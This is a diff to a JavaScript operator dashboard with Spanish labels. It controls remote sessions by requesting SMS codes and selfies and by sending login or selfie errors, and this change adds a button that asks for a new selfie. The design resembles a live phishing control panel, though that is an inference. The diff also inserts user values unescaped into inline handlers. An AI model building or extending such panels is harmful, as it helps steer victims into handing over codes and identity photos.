@@ -179,11 +179,6 @@ function createRow(row) {
     setRowState(row.id, 'waiting-sms', 'sms')
   })
   tr.querySelector('[data-action="selfie"]')?.addEventListener('click', () => {
-    const current = rows.get(row.id)
-    if (current?.state === 'waiting-selfie') {
-      setRowState(row.id, 'waiting', null)
-      return
-    }
     setRowState(row.id, 'waiting-selfie', 'selfie')
   })
   tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
@@ -374,9 +369,10 @@ function render() {
             </div>
             <div class="selfie-card-meta">${laneName} · ${formatTime(s.timestamp)}</div>
             <div class="selfie-card-actions">
-              <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')">🔍 Ver</button>
-              <button type="button" class="btn btn--error" onclick="window.setRowState('${s.sessionId}', 'error-selfie', 'error-selfie')">❌ Err</button>
-              <button type="button" class="btn btn--done" onclick="window.setRowState('${s.sessionId}', 'done', 'done')">✅ Listo</button>
+              <button type="button" class="btn btn--ok" style="background:#7c3aed; color:#fff;" onclick="window.openSelfieModal('${s.photo}', '${s.user} (${photoLabel})')" title="Ver foto ampliada">🔍 Ver</button>
+              <button type="button" class="btn" style="background:#2563eb; color:#fff;" onclick="window.setRowState('${s.sessionId}', 'waiting-selfie', 'selfie')" title="Pedir nueva selfie">📸 Otra</button>
+              <button type="button" class="btn btn--error" onclick="window.setRowState('${s.sessionId}', 'error-selfie', 'error-selfie')" title="Enviar error de selfie">❌ Err</button>
+              <button type="button" class="btn btn--done" onclick="window.setRowState('${s.sessionId}', 'done', 'done')" title="Completar">✅ Listo</button>
             </div>
           </div>
         `;
